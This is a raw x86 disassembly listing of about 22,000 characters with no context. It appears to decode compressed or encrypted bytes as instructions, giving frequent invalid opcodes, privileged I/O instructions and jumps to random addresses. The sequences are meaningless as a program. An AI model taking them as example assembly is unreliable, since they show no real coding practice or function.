  48d1bc:	test   eax,0x74cfb244
  48d1c1:	adc    DWORD PTR [ecx],edi
  48d1c3:	jns    0x48d1c1
  48d1c5:	cld    
  48d1c6:	push   ds
  48d1c7:	cmc    
  48d1c8:	adc    DWORD PTR [ebx+0x28c6a02],ecx
  48d1ce:	fiadd  DWORD PTR [ecx+0x144bbe03]
  48d1d4:	aad    0xdf
  48d1d6:	xor    al,0x4d
  48d1d8:	xor    ebx,DWORD PTR [esi+0x14100c04]
  48d1de:	inc    esp
  48d1df:	cmp    DWORD PTR [ebx+0x20],edi
  48d1e2:	jbe    0x48d1b9
  48d1e4:	and    BYTE PTR [esp+ecx*4+0x19],bl
  48d1e8:	dec    edx
  48d1e9:	push   ebx
  48d1ea:	sbb    al,0x8b
  48d1ec:	adc    BYTE PTR [eax],cl
  48d1ee:	pop    esi
  48d1ef:	loop   0x48d240
  48d1f1:	adc    ebp,DWORD PTR [edi]
  48d1f3:	jae    0x48d215
  48d1f5:	jb     0x48d1e0
  48d1f7:	lea    esi,[ebx-0x48]
  48d1fa:	fcomp  QWORD PTR [eax+eiz*8]
  48d1fd:	and    edx,edx
  48d1ff:	ror    BYTE PTR [esi],cl
  48d201:	sub    BYTE PTR [edx+edx*8+0xe1004e9],ch
  48d208:	mov    bl,0xc2
  48d20a:	xchg   ecx,eax
  48d20b:	pop    ebp
  48d20c:	jnp    0x48d196
  48d20e:	mov    dh,0x76
  48d210:	sbb    al,0x80
  48d212:	mov    eax,ds:0x3581b007
  48d217:	mov    BYTE PTR [eax],ch
  48d219:	push   edi
  48d21a:	sar    BYTE PTR [ecx],1
  48d21c:	jb     0x48d24a
  48d21e:	adc    eax,0x17ef8535
  48d223:	sbb    BYTE PTR [ecx-0x42],dh
  48d226:	adc    bh,bl
  48d228:	lods   eax,DWORD PTR ds:[esi]
  48d229:	mov    eax,ds:0x1c504214
  48d22e:	nop
  48d22f:	retf   
  48d230:	and    DWORD PTR [eax],eax
  48d232:	add    BYTE PTR [ebx+0x460660d],cl
  48d238:	dec    ebx
  48d239:	mov    DWORD PTR fs:[edi],edx
  48d23c:	shr    BYTE PTR [edx+0x6c],0x40
  48d240:	mov    edi,0xd5530250
  48d245:	popf   
  48d246:	mov    eax,0x58840e10
  48d24b:	cdq    
  48d24c:	(bad)  
  48d24d:	lea    eax,[ebx-0x4]
  48d250:	adc    al,0xe3
  48d252:	out    dx,eax
  48d253:	push   esp
  48d254:	inc    ebx
  48d255:	cmp    BYTE PTR [esi],ah
  48d257:	dec    edi
  48d258:	mov    ah,0x78
  48d25a:	adc    eax,0x304e6c1
  48d25f:	repz cmp ch,BYTE PTR [ebx+0x5e]
  48d263:	dec    ebp
  48d264:	inc    edi
  48d265:	fnstsw WORD PTR [ebx+ecx*4-0x239a9fd4]
  48d26c:	ins    DWORD PTR es:[edi],dx
  48d26d:	clc    
  48d26e:	in     al,0x74
  48d270:	(bad)  
  48d271:	and    BYTE PTR [esi-0x346384f7],ah
  48d277:	mov    DWORD PTR [edi+0x3c7ed96],ebx
  48d27d:	mov    BYTE PTR fs:[eax],dl
  48d280:	js     0x48d2fc
  48d282:	xor    DWORD PTR [ecx],ebp
  48d284:	and    eax,edx
  48d286:	or     BYTE PTR [edx+ecx*2+0x8783952],al
  48d28d:	mov    esp,0x4bab352d
  48d292:	shr    DWORD PTR [esi+0x539a7b09],1
  48d298:	retf   
  48d299:	mov    ebx,DWORD PTR [ecx+ecx*1-0x40f9f7f8]
  48d2a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48d2a1:	xchg   esi,eax
  48d2a2:	sbb    eax,0x4852108b
  48d2a7:	or     DWORD PTR [edi+0x2a5e0a61],ecx
  48d2ad:	push   ecx
  48d2ae:	and    DWORD PTR [eax],ecx
  48d2b0:	and    ebx,ebp
  48d2b2:	xchg   esi,eax
  48d2b3:	inc    edx
  48d2b4:	test   al,0xa1
  48d2b6:	add    BYTE PTR [edi+0x8],bh
  48d2b9:	sbb    BYTE PTR [edi+0x2f],dl
  48d2bc:	lea    ebp,[ebx]
  48d2be:	imul   edi,DWORD PTR [edx],0x7a
  48d2c1:	jno    0x48d262
  48d2c3:	fist   WORD PTR [edx+ecx*1]
  48d2c6:	add    eax,0x42743f30
  48d2cb:	clc    
  48d2cc:	cmp    di,si
  48d2cf:	je     0x48d285
  48d2d1:	test   BYTE PTR [ecx+0x98b2ced],0x22
  48d2d8:	sbb    al,0x41
  48d2da:	inc    eax
  48d2db:	iret   
  48d2dc:	push   ds
  48d2dd:	(bad)  [ebp+esi*1-0x58]
  48d2e1:	es (bad) 
  48d2e3:	test   eax,0x2714c4d
  48d2e8:	inc    esi
  48d2e9:	enterw 0xe1e9,0x16
  48d2ee:	add    al,BYTE PTR [edx+edx*4+0x44e2e26]
  48d2f5:	adc    DWORD PTR [ecx],0x65
  48d2f8:	dec    DWORD PTR [esi-0x4b]
  48d2fb:	xor    dl,BYTE PTR [eax]
  48d2fd:	lods   al,BYTE PTR ds:[esi]
  48d2fe:	mov    ah,0xc0
  48d300:	cmp    WORD PTR [ecx],bx
  48d303:	(bad)  
  48d304:	push   ds
  48d305:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48d306:	in     eax,0xd4
  48d308:	jo     0x48d305
  48d30a:	pop    ds
  48d30b:	jl     0x48d340
  48d30d:	xor    edx,edx
  48d30f:	push   ds
  48d310:	mov    ecx,0xbdb895b9
  48d315:	xchg   edi,eax
  48d316:	fistp  QWORD PTR [ebx]
  48d318:	icebp  
  48d319:	je     0x48d33b
  48d31b:	sub    BYTE PTR [edx*2-0x7fbdc9ce],cl
  48d322:	fld    QWORD PTR [edi]
  48d324:	je     0x48d2d3
  48d326:	in     eax,dx
  48d327:	jo     0x48d317
  48d329:	jo     0x48d39b
  48d32b:	ins    BYTE PTR es:[edi],dx
  48d32c:	lods   al,BYTE PTR ds:[esi]
  48d32d:	mov    esp,0x47afa7a6
  48d332:	jmp    0x48d311
  48d334:	aas    
  48d335:	fistp  QWORD PTR [ecx+eiz*8]
  48d338:	jne    0x48d38f
  48d33a:	cmp    DWORD PTR [edx-0x80],esp
  48d33d:	stc    
  48d33e:	pop    ds
  48d33f:	adc    dl,dh
  48d341:	inc    edx
  48d342:	dec    esi
  48d343:	xor    al,0x53
  48d345:	inc    esp
  48d346:	push   ebx
  48d347:	or     ch,BYTE PTR fs:[ecx+0x6bacdeb4]
  48d34e:	int3   
  48d34f:	or     cl,BYTE PTR [ebx]
  48d351:	in     al,0x2a
  48d353:	push   esp
  48d354:	test   BYTE PTR [edx-0x57],dl
  48d357:	xor    al,0x83
  48d359:	sub    bl,al
  48d35b:	add    cl,BYTE PTR ds:0xe0fc3c67
  48d361:	sub    al,0xfa
  48d363:	and    BYTE PTR [ebx+0x3dcb7701],ah
  48d369:	sar    BYTE PTR [eax+0x64d8bf09],cl
  48d36f:	loop   0x48d368
  48d371:	or     esi,DWORD PTR [eax]
  48d373:	jne    0x48d389
  48d375:	or     DWORD PTR ds:0xe4116811,0x4b
  48d37c:	mov    ebx,0xdcb8add3
  48d381:	and    al,0xb7
  48d383:	mov    edi,0x91deb0c
  48d388:	pop    es
  48d389:	sar    DWORD PTR [ebp-0x1c],cl
  48d38c:	lock mov edi,0x13eed605
  48d392:	lock stos BYTE PTR es:[edi],al
  48d394:	pop    esi
  48d395:	mov    eax,0x8556670a
  48d39a:	mov    WORD PTR [eax+0x1],?
  48d39d:	out    0x5d,al
  48d39f:	xchg   ebx,eax
  48d3a0:	and    esi,DWORD PTR [ecx]
  48d3a2:	or     BYTE PTR [edi],al
  48d3a4:	push   esi
  48d3a5:	inc    edx
  48d3a6:	push   es
  48d3a7:	xor    DWORD PTR [ebp+0x6d],0x2f
  48d3ab:	and    eax,0x4cd5ec6
  48d3b0:	push   ebx
  48d3b1:	fldenv [ebx]
  48d3b3:	mov    bl,0xb6
  48d3b5:	mov    cl,0x10
  48d3b7:	mov    BYTE PTR [ecx],0x5f
  48d3ba:	(bad)  
  48d3bb:	cmp    cl,0x62
  48d3be:	sti    
  48d3bf:	pop    edi
  48d3c0:	and    eax,esi
  48d3c2:	mov    BYTE PTR [esi+0x40],cl
  48d3c5:	cmp    eax,esi
  48d3c7:	jb     0x48d3b8
  48d3c9:	test   bl,bl
  48d3cb:	push   0x748e6dc9
  48d3d0:	mov    WORD PTR [edi-0x7d],cs
  48d3d3:	push   ds
  48d3d4:	inc    esi
  48d3d5:	loop   0x48d3eb
  48d3d7:	sub    BYTE PTR [edx+edi*4-0x17],al
  48d3db:	or     al,0x99
  48d3dd:	push   cs
  48d3de:	xchg   ebx,eax
  48d3df:	push   ds
  48d3e0:	add    cl,bh
  48d3e2:	and    BYTE PTR [edi+0x206c7f2],bl
  48d3e8:	test   ecx,0xa7e3c6e4
  48d3ee:	shl    edi,1
  48d3f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48d3f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48d3f2:	ror    BYTE PTR [ebp-0x80],1
  48d3f5:	aaa    
  48d3f6:	add    dh,BYTE PTR [esi]
  48d3f8:	adc    BYTE PTR [edx+0x7],ch
  48d3fb:	push   0x9f0ec3b8
  48d400:	cmp    cl,BYTE PTR [ebx-0x42de5367]
  48d406:	cmp    DWORD PTR [esi],0xffffffff
  48d409:	bound  edx,QWORD PTR [esi+0x5e5d5899]
  48d40f:	aas    
  48d410:	sbb    edx,DWORD PTR [ebx]
  48d412:	dec    ebp
  48d413:	(bad)  
  48d414:	mov    edx,0x808ac4a8
  48d419:	add    al,0x69
  48d41b:	ret    0xffc3
  48d41e:	retf   0x8f6b
  48d421:	cmp    BYTE PTR ds:0xb773d1ff,cl
  48d427:	aas    
  48d428:	mov    al,0x87
  48d42a:	outs   dx,BYTE PTR ds:[esi]
  48d42b:	lods   eax,DWORD PTR ds:[esi]
  48d42c:	(bad)  
  48d42d:	push   ebx
  48d42e:	mov    eax,DWORD PTR [esi-0x42ada798]
  48d434:	in     eax,dx
  48d435:	xor    ebx,eax
  48d437:	fist   WORD PTR [ecx-0x73]
  48d43a:	sbb    al,bh
  48d43c:	add    al,0x17
  48d43e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48d43f:	pmulhuw mm3,mm3
  48d442:	inc    ebp
  48d443:	int3   
  48d444:	test   BYTE PTR [esi+0x56],bh
  48d447:	jns    0x48d3d4
  48d449:	or     BYTE PTR [ebx],bh
  48d44b:	loop   0x48d3d8
  48d44d:	dec    ebx
  48d44e:	add    ebp,DWORD PTR [ebp+0x2a]
  48d451:	(bad)  [esi-0x1c]
  48d454:	add    eax,0x56598581
  48d459:	stos   DWORD PTR es:[edi],eax
  48d45a:	xor    al,0xe
  48d45c:	and    DWORD PTR ds:0xcc654341,esi
  48d462:	pop    ds
  48d463:	outs   dx,BYTE PTR ds:[esi]
  48d464:	aad    0xc
  48d466:	mov    edx,0x7d9068ec
  48d46b:	mov    ecx,DWORD PTR [ebp+0x18b4ba40]
  48d471:	mov    ebx,0x32003a8c
  48d476:	dec    esp
  48d477:	nop
  48d478:	cmp    al,0x7d
  48d47a:	clc    
  48d47b:	sub    al,0x35
  48d47d:	push   0x325e31c3
  48d482:	(bad)  
  48d483:	jo     0x48d42c
  48d485:	jg     0x48d490
  48d487:	sar    BYTE PTR [ebp+0x6ac0838c],1
  48d48d:	add    DWORD PTR [ebp+0x72a2129e],eax
  48d493:	push   es
  48d494:	jbe    0x48d512
  48d496:	adc    esp,DWORD PTR [esp+ebp*1+0x4f]
  48d49a:	cmp    al,0x85
  48d49c:	mov    ds:0x80bdf96b,al
  48d4a1:	mov    esi,0x565e0f53
  48d4a6:	push   eax
  48d4a7:	inc    edx
  48d4a8:	clc    
  48d4a9:	push   edx
  48d4aa:	add    edi,edi
  48d4ac:	push   eax
  48d4ad:	js     0x48d4a4
  48d4af:	rcl    BYTE PTR [esp+esi*1],cl
  48d4b2:	dec    esp
  48d4b3:	je     0x48d52a
  48d4b5:	sub    ebx,DWORD PTR [eax]
  48d4b7:	shr    eax,1
  48d4b9:	lea    esp,[eax-0x24]
  48d4bc:	aas    
  48d4bd:	repnz cmp eax,DWORD PTR [ebp+0x10]
  48d4c1:	jae    0x47383b3b
  48d4c7:	stos   DWORD PTR es:[edi],eax
  48d4c8:	lahf   
  48d4c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48d4ca:	js     0x48d520
  48d4cc:	push   eax
  48d4cd:	fmul   DWORD PTR [esp+eax*4+0x5f]
  48d4d1:	mov    al,bl
  48d4d3:	pop    ebx
  48d4d4:	mov    eax,ds:0x27bb2120
  48d4d9:	xor    bl,bl
  48d4db:	pop    ds
  48d4dc:	ss or  al,0xca
  48d4df:	jbe    0x48d525
  48d4e1:	mov    dh,0xfc
  48d4e3:	and    DWORD PTR [esi-0x61eb88ed],esi
  48d4e9:	lods   al,BYTE PTR ds:[esi]
  48d4ea:	jne    0x48d4c8
  48d4ec:	xor    eax,0xad794340
  48d4f1:	pop    ebp
  48d4f2:	mov    esp,0x479f631e
  48d4f7:	and    edx,DWORD PTR [eax-0x20]
  48d4fa:	push   esp
  48d4fb:	or     al,0x28
  48d4fd:	or     BYTE PTR ds:[ebp+0x3b],cl
  48d501:	ret    
  48d502:	addr16 pusha 
  48d504:	stc    
  48d505:	push   esi
  48d506:	push   ss
  48d507:	and    edi,ebx
  48d509:	mov    esp,0x42708f0f
  48d50e:	or     al,0xee
  48d510:	in     eax,dx
  48d511:	mov    cs,WORD PTR [ebx-0x5c4bf635]
  48d517:	aaa    
  48d518:	add    dl,BYTE PTR [edi]
  48d51a:	ret    0x9d08
  48d51d:	sub    ch,BYTE PTR [ecx-0x3b]
  48d520:	aam    0x4a
  48d522:	enter  0x2076,0x78
  48d526:	jmp    0x239fdfae
  48d52b:	mov    dh,0x5e
  48d52d:	test   DWORD PTR [edi],ebx
  48d52f:	cmp    BYTE PTR [ebx+0x4c],al
  48d532:	or     al,0x3c
  48d534:	mov    dl,BYTE PTR [edi+0x23]
  48d537:	mov    WORD PTR [ebx+0x5a063710],fs
  48d53d:	(bad)  
  48d53e:	sbb    BYTE PTR [edx],al
  48d540:	xlat   BYTE PTR ds:[ebx]
  48d541:	shl    BYTE PTR [edx],1
  48d543:	sar    bh,cl
  48d545:	inc    edx
  48d546:	call   0x740b:0x2226a789
  48d54d:	aas    
  48d54e:	dec    eax
  48d54f:	jne    0x48d527
  48d551:	jno    0x48d596
  48d553:	adc    al,0x10
  48d555:	push   0xebd49735
  48d55a:	retf   0xae30
  48d55d:	dec    esp
  48d55e:	add    eax,0x8947cc2f
  48d563:	mov    fs,WORD PTR ds:0x8215f887
  48d56a:	fadd   QWORD PTR [esi+edi*2+0xe]
  48d56e:	loop   0x48d56c
  48d570:	dec    ebx
  48d571:	jmp    0x48d50d
  48d573:	inc    ebx
  48d574:	jmp    0x48d50d
  48d576:	pop    es
  48d577:	push   cs
  48d578:	test   eax,eax
  48d57a:	jle    0x48d586
  48d57c:	jmp    0xc9964b07
  48d581:	lahf   
  48d582:	push   edi
  48d583:	push   esi
  48d584:	sbb    eax,0x3f974788
  48d589:	in     al,0x67
  48d58b:	mov    esp,0x37071530
  48d590:	pushf  
  48d591:	push   esp
  48d593:	mov    edx,eax
  48d595:	mov    al,0xa6
  48d597:	daa    
  48d598:	dec    esi
  48d599:	mov    eax,ds:0x46453815
  48d59e:	pop    ss
  48d59f:	pop    ebx
  48d5a0:	loop   0x48d5d7
  48d5a2:	popf   
  48d5a3:	rcl    BYTE PTR [eax+0x2],cl
  48d5a6:	or     BYTE PTR [edi-0xb],bl
  48d5a9:	rcl    DWORD PTR [ebx],0xb4
  48d5ac:	jge    0x48d609
  48d5ae:	pop    ss
  48d5af:	fiadd  WORD PTR [edx]
  48d5b1:	fnstcw WORD PTR [eax+0x9]
  48d5b4:	pop    ds
  48d5b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48d5b6:	or     ch,BYTE PTR [eax]
  48d5b8:	dec    ecx
  48d5b9:	mov    DWORD PTR ds:0x1581703b,ecx
  48d5bf:	sbb    dh,bl
  48d5c1:	cwde   
  48d5c2:	dec    eax
  48d5c3:	or     BYTE PTR [ebx+ebx*8-0x46],ah
  48d5c7:	push   ebx
  48d5c8:	add    BYTE PTR [edi+0x1b345838],dl
  48d5ce:	int    0xb
  48d5d0:	inc    esi
  48d5d1:	xor    DWORD PTR [esi+0x21],ebp
  48d5d4:	jne    0x48d59e
  48d5d6:	retf   0xe1c3
  48d5d9:	dec    esp
  48d5da:	ror    BYTE PTR [ecx-0x403ccfe1],1
  48d5e0:	mov    esi,DWORD PTR ds:0x754825e
  48d5e6:	(bad)  
  48d5e7:	js     0x48d599
  48d5e9:	sbb    al,0x22
  48d5eb:	pop    ecx
  48d5ec:	lods   eax,DWORD PTR ds:[esi]
  48d5ed:	xchg   esi,eax
  48d5ee:	mov    cl,0x6a
  48d5f0:	clc    
  48d5f1:	pusha  
  48d5f2:	mov    ah,0xfa
  48d5f4:	xor    al,0xcc
  48d5f6:	add    ah,BYTE PTR [esi-0x26fb3732]
  48d5fc:	and    ecx,DWORD PTR [edx+ecx*2+0x4]
  48d600:	sub    dl,BYTE PTR [ebx-0x40]
  48d603:	and    esp,DWORD PTR [ebx-0x5e]
  48d606:	aas    
  48d607:	pop    esp
  48d608:	mov    eax,0xbf32e8a0
  48d60d:	sbb    bh,BYTE PTR [esi]
  48d60f:	mov    eax,0xe8034688
  48d614:	aas    
  48d615:	sub    al,0x8d
  48d617:	mov    al,ds:0x9d360256
  48d61c:	aam    0xcf
  48d61e:	icebp  
  48d61f:	sbb    al,0xb
  48d621:	cmp    eax,0xf2c22055
  48d626:	lods   al,BYTE PTR ds:[esi]
  48d627:	sar    BYTE PTR [edi+edx*8-0x3],1
  48d62b:	icebp  
  48d62c:	jbe    0x48d638
  48d62e:	cli    
  48d62f:	loopne 0x48d5bd
  48d631:	push   eax
  48d632:	push   esi
  48d633:	(bad)  
  48d635:	ins    BYTE PTR es:[edi],dx
  48d636:	repz sbb BYTE PTR [edx],bl
  48d639:	sub    esp,DWORD PTR [edi+edi*1]
  48d63c:	sbb    DWORD PTR [esi],esi
  48d63e:	ror    BYTE PTR [edi+0x34],0x54
  48d642:	jge    0x48d5d2
  48d644:	out    0x5c,eax
  48d646:	scas   eax,DWORD PTR es:[edi]
  48d647:	test   eax,0xf769c69d
  48d64c:	and    ah,cl
  48d64e:	cmp    DWORD PTR [ebx],0x4
  48d651:	push   ss
  48d652:	sar    bl,0xd0
  48d655:	loopne 0x48d5e8
  48d657:	stos   DWORD PTR es:[edi],eax
  48d658:	xor    bl,BYTE PTR [esi+edx*2-0x68]
  48d65c:	and    eax,0x5171e13b
  48d661:	mov    DWORD PTR [ebx],0xbc23ee1f
  48d667:	ret    
  48d668:	repnz xor eax,0x203e8c
  48d66e:	add    DWORD PTR [esi],eax
  48d670:	(bad)  
  48d671:	mov    ebx,0x8a907898
  48d676:	mov    BYTE PTR [eax-0x676f7596],ah
  48d67c:	or     cl,BYTE PTR [eax-0x771ffab4]
  48d682:	push   esp
  48d683:	add    eax,0xa18ba7e9
  48d688:	call   0xe6c4df33
  48d68d:	push   es
  48d68e:	push   0x561b8140
  48d693:	stos   BYTE PTR es:[edi],al
  48d694:	jnp    0x48d6c5
  48d696:	add    DWORD PTR [esi],esp
  48d698:	dec    esp
  48d699:	rol    BYTE PTR [edi+0x2],0x12
  48d69d:	pop    ecx
  48d69e:	inc    ebx
  48d69f:	scas   al,BYTE PTR es:[edi]
  48d6a0:	lds    eax,FWORD PTR [eax]
  48d6a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48d6a3:	mov    dl,0x61
  48d6a5:	dec    eax
  48d6a6:	pop    ecx
  48d6a7:	push   edi
  48d6a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48d6a9:	fisttp WORD PTR [ecx]
  48d6ab:	mov    eax,0x958d4563
  48d6b0:	loopne 0x48d6b1
  48d6b2:	(bad)  
  48d6b3:	call   FWORD PTR [edx-0x49]
  48d6b6:	and    ah,cl
  48d6b8:	adc    DWORD PTR [esi],ebx
  48d6ba:	cmp    eax,0x189410ac
  48d6bf:	jl     0x48d71d
  48d6c1:	adc    ebp,DWORD PTR [edx]
  48d6c3:	mov    ah,0x1b
  48d6c5:	jb     0x48d73e
  48d6c7:	in     al,dx
  48d6c8:	mov    ds:0x7d2eb422,al
  48d6cd:	idiv   DWORD PTR [edi-0x37]
  48d6d0:	mov    bl,BYTE PTR [ebp+ecx*1-0x20]
  48d6d4:	lea    eax,[ecx+edx*1]
  48d6d7:	cmp    bl,BYTE PTR [ebp+eax*1-0x7cd38bab]
  48d6de:	stc    
  48d6df:	adc    al,0x90
  48d6e1:	daa    
  48d6e2:	adc    BYTE PTR [esi-0x5f],bl
  48d6e5:	data16 or bh,BYTE PTR [ebx]
  48d6e8:	(bad)  
  48d6e9:	jl     0x48d6cb
  48d6eb:	push   ss
  48d6ec:	pushf  
  48d6ed:	sub    edx,DWORD PTR [edx+ebx*1+0x39548de0]
  48d6f4:	sub    al,0x38
  48d6f6:	sbb    BYTE PTR [ecx+0x65fbc855],cl
  48d6fc:	mov    edx,0x90ee96f4
  48d701:	jmp    0x48d699
  48d703:	jbe    0x48d6e6
  48d705:	jmp    0x48d68d
  48d707:	icebp  
  48d708:	retf   0x11e1
  48d70b:	inc    ecx
  48d70c:	jmp    0x48d6cf
  48d70e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48d70f:	mov    ds:0x680cf232,eax
  48d714:	inc    eax
  48d715:	loop   0x48d6f9
  48d717:	add    eax,0x177919d
  48d71c:	in     al,dx
  48d71d:	sahf   
  48d71e:	sub    bl,ah
  48d720:	jecxz  0x48d778
  48d722:	inc    esi
  48d723:	fidiv  WORD PTR ds:0x26d84ede
  48d729:	in     al,0xe4
  48d72b:	test   BYTE PTR [ecx],ch
  48d72d:	add    al,0x7e
  48d72f:	dec    ecx
  48d730:	jbe    0x48d78a
  48d732:	je     0x48d71a
  48d734:	dec    esi
  48d735:	loope  0x48d76b
  48d737:	shl    edx,cl
  48d739:	mov    edi,0x65e63e4a
  48d73e:	xor    eax,0xccce6242
  48d743:	jne    0x48d76e
  48d745:	loopne 0x48d752
  48d747:	js     0x48d702
  48d749:	mov    ebp,0x2e9c7810
  48d74e:	gs dec ebx
  48d750:	dec    ebp
  48d751:	or     dl,BYTE PTR [edi+0x53]
  48d754:	data16 jl 0x48d718
  48d757:	pop    esi
  48d758:	inc    edx
  48d759:	outs   dx,DWORD PTR ds:[esi]
  48d75a:	mov    fs,WORD PTR [eax+0x2d0c7cf7]
  48d760:	mov    al,0xec
  48d762:	push   ss
  48d763:	pop    ss
  48d764:	dec    ebx
  48d765:	push   esi
  48d766:	push   eax
  48d767:	inc    eax
  48d768:	ja     0x48d724
  48d76a:	jp     0x48d74d
  48d76c:	push   ecx
  48d76d:	or     ch,0x5e
  48d770:	or     eax,0xf0110a9e
  48d775:	push   edi
  48d776:	jmp    0x48d748
  48d778:	aas    
  48d779:	(bad)
  48d77c:	test   eax,0xffc983f4
  48d781:	mov    ebx,0xc4ece6ff
  48d786:	and    eax,0x61b63c52
  48d78b:	push   esi
  48d78c:	and    eax,0x953b623f
  48d791:	jo     0x48d79f
  48d793:	in     eax,dx
  48d794:	call   0xa95b16b5
  48d799:	inc    eax
  48d79a:	jnp    0x48d7b3
  48d79c:	call   0x92a8a3ed
  48d7a1:	mov    WORD PTR [edi+edi*4+0x4a],?
  48d7a5:	inc    eax
  48d7a6:	mov    dh,0x54
  48d7a8:	or     al,0x18
  48d7aa:	add    eax,edx
  48d7ac:	or     eax,0xaeb1a19
  48d7b1:	sbb    ecx,DWORD PTR [ebx+ebx*1+0x100012e2]
  48d7b8:	jl     0x48d796
  48d7ba:	lea    edx,[edi+0x7c]
  48d7bd:	adc    BYTE PTR [edx],ch
  48d7bf:	out    dx,al
  48d7c0:	push   0xbe39e120
  48d7c5:	shl    eax,1
  48d7c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48d7c8:	ds and al,0x7
  48d7cb:	mov    dl,0x34
  48d7cd:	test   dl,dh
  48d7cf:	xor    edx,DWORD PTR [eax+0x74]
  48d7d2:	test   al,0xae
  48d7d4:	mov    esp,0xf8e301b
  48d7d9:	ins    BYTE PTR es:[edi],dx
  48d7da:	lock push es
  48d7dc:	mov    ds:0x3a6c0765,al
  48d7e1:	inc    edx
  48d7e2:	popa   
  48d7e3:	push   0xffffffc1
  48d7e5:	push   es
  48d7e6:	inc    ecx
  48d7e7:	sub    esi,DWORD PTR [esi+0x46]
  48d7ea:	inc    esp
  48d7eb:	stos   DWORD PTR es:[edi],eax
  48d7ec:	ss out 0x9b,al
  48d7ef:	outs   dx,DWORD PTR ds:[esi]
  48d7f0:	inc    edi
  48d7f2:	inc    esi
  48d7f3:	xor    al,0x1
  48d7f5:	and    eax,DWORD PTR [ebp+0x67]
  48d7f8:	or     al,0x38
  48d7fa:	mov    DWORD PTR [ebx-0x1c31033],ebp
  48d800:	fdivr  QWORD PTR [edx-0x4c7d3968]
  48d806:	icebp  
  48d807:	inc    eax
  48d808:	jbe    0x48d85e
  48d80a:	xor    ah,ch
  48d80c:	ins    DWORD PTR es:[edi],dx
  48d80d:	fld    DWORD PTR [ecx-0x1b]
  48d810:	imul   eax,DWORD PTR [ecx+esi*8],0xffffff9c
  48d814:	and    eax,0x2293d82c
  48d819:	test   DWORD PTR [ebx-0x1e1aa2c],esi
  48d81f:	adc    edi,DWORD PTR [edi+ecx*1+0x2c]
  48d823:	cmp    eax,0xe9e28f88
  48d828:	or     al,0x1f
  48d82a:	mov    ecx,DWORD PTR [edi+0x44]
  48d82d:	(bad)  
  48d82e:	shl    DWORD PTR [edi],0xe9
  48d831:	ja     0x48d875
  48d833:	loop   0x48d7c2
  48d835:	or     al,0xf1
  48d837:	lea    edx,[esi*8-0x50f20ad]
  48d83e:	jbe    0x48d820
  48d840:	aas    
  48d841:	mov    DWORD PTR [eax],esi
  48d843:	cmp    ecx,edx
  48d845:	jb     0xc14faf2f
  48d84b:	jmp    0x6e97d96d
  48d850:	clc    
  48d851:	shld   DWORD PTR [eax+0x64],ecx,0x0
  48d856:	sub    ebx,eax
  48d858:	cmp    esi,ebx
  48d85a:	jae    0x48d87a
  48d85c:	push   ds
  48d85d:	sub    esi,ebx
  48d85f:	add    edx,DWORD PTR [ebp+0x0]
  48d862:	push   esp
  48d863:	test   BYTE PTR [esi-0x54],ch
  48d866:	dec    esp
  48d867:	and    DWORD PTR [eax],ecx
  48d869:	aaa    
  48d86a:	mov    WORD PTR [ebx-0x1f],ss
  48d86d:	jnp    0x48d7f3
  48d86f:	(bad)  
  48d870:	mov    ecx,0x5253b657
  48d875:	xor    eax,0x4c4f8d33
  48d87a:	shr    BYTE PTR [ecx+0x6f],cl
  48d87d:	or     eax,0x4312ea07
  48d882:	aas    
  48d883:	cmp    eax,esi
  48d885:	scas   al,BYTE PTR es:[edi]
  48d886:	xchg   esp,eax
  48d887:	imul   esi,DWORD PTR ds:0xb984a8d1,0x9c124bf
  48d891:	aas    
  48d892:	cmp    bl,BYTE PTR [edi+0x44]
  48d895:	mov    edx,0x5e17444
  48d89a:	add    eax,0x74e91b78
  48d89f:	or     ecx,DWORD PTR [eax]
  48d8a1:	add    eax,DWORD PTR [ebx-0x3e55c01f]
  48d8a7:	sub    bh,BYTE PTR [edx+eax*8-0x27cf0c8]
  48d8ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48d8af:	mov    eax,0x9dc11b38
  48d8b4:	mov    al,ds:0xda489383
  48d8b9:	mov    ebx,0x6dfa9e8c
  48d8be:	and    BYTE PTR [edx-0x45cb88e5],bh
  48d8c4:	adc    BYTE PTR [ebp+0x5f870d2f],dh
  48d8ca:	push   ecx
  48d8cb:	jmp    0x6a9c6d6a
  48d8d0:	adc    BYTE PTR [esi+0x12691836],dl
  48d8d6:	push   esi
  48d8d7:	inc    eax
  48d8d8:	xor    BYTE PTR [eax],bl
  48d8da:	push   ecx
  48d8db:	dec    ebp
  48d8dc:	pop    esp
  48d8dd:	push   0x2416e6c3
  48d8e2:	mov    BYTE PTR [ebx],0x0
  48d8e5:	push   edi
  48d8e6:	sbb    al,0x42
  48d8e8:	sub    BYTE PTR [edi+0x523e14ac],bl
  48d8ee:	mov    ebx,0x6ef15e13
  48d8f3:	push   0xb43d9338
  48d8f8:	push   0xffffff89
  48d8fa:	es pop esp
  48d8fc:	int3   
  48d8fd:	inc    edx
  48d8fe:	lds    ebp,FWORD PTR [ebx-0x17c93ba]
  48d904:	fcmovu st,st(2)
  48d906:	dec    ebp
  48d907:	call   0x5630:0xdc6226ff
  48d90e:	lea    esi,[edx-0x1]
  48d911:	shr    esi,0x2
  48d914:	inc    ecx
  48d915:	inc    esi
  48d916:	sahf   
  48d917:	(bad)  
  48d918:	jle    0x48d8f9
  48d91a:	jle    0x48d96c
  48d91c:	dec    BYTE PTR [eax-0xf300af]
  48d922:	mov    BYTE PTR [ecx],dl
  48d924:	or     dl,BYTE PTR [eax]
  48d926:	push   ss
  48d927:	add    DWORD PTR [ecx],eax
  48d929:	clc    
  48d92a:	rdtsc  
  48d92c:	ror    DWORD PTR [edx+eax*1],1
  48d92f:	sbb    bl,BYTE PTR [esi+ecx*2+0x75]
  48d933:	fstp   QWORD PTR [esi-0x3d]
  48d936:	aas    
  48d937:	mov    BYTE PTR [ebp+0x28],al
  48d93a:	call   FWORD PTR [edi+eax*8]
  48d93d:	inc    eax
  48d93e:	test   BYTE PTR [esi],al
